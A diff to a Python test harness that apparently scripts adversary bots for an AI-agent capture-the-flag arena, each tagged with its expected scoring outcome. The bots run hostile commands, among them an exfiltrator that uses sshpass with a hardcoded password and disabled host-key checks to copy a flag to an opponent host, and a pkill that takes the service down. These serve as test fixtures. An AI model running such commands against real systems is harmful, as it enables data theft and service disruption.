@@ -29,8 +29,15 @@ BOTS = {
     "encryptor":    lambda c, *_: dexec(c, "base64 /home/agent/flag.txt > /home/agent/flag.b64 && rm /home/agent/flag.txt", "agent"),
     # expected: LEGAL — flag still present, just hidden + immutable-ish
     "mover":        lambda c, *_: dexec(c, "mkdir -p /home/agent/.cache/x && mv /home/agent/flag.txt /home/agent/.cache/x/.z && chmod 400 /home/agent/.cache/x/.z", "agent"),
-    # expected: opponent wins (own flag readable on the opponent's box = capture)
-    "exfiltrator":  lambda c, opp=None, *_: dexec(c, f"T=$(cat /home/agent/flag.txt); sshpass -p password123 ssh -o StrictHostKeyChecking=no agent@{opp} \"echo $T > /tmp/stolen\"" , "agent"),
+    # expected: opponent wins (own flag readable on the opponent's box = capture).
+    # Three destinations on purpose (task #451): the opponent's home is in the exported ROOT
+    # filesystem, /tmp is a compose tmpfs and /dev/shm is docker's default tmpfs — `docker
+    # export` carries neither of the last two, so one copy pins each host-side reader.
+    "exfiltrator":  lambda c, opp=None, *_: dexec(c, f"T=$(cat /home/agent/flag.txt); "
+                        f"sshpass -p password123 ssh -o StrictHostKeyChecking=no agent@{opp} "
+                        f"\"printf '%s' '$T' > /home/agent/stolen; "
+                        f"printf '%s' '$T' > /tmp/stolen; "
+                        f"printf '%s' '$T' > /dev/shm/stolen\"" , "agent"),
     # expected: service-uptime forfeit after DOWN_STRIKES checks
     "service_kill": lambda c, *_: dexec(c, "pkill -f app.py", "agent"),
 }
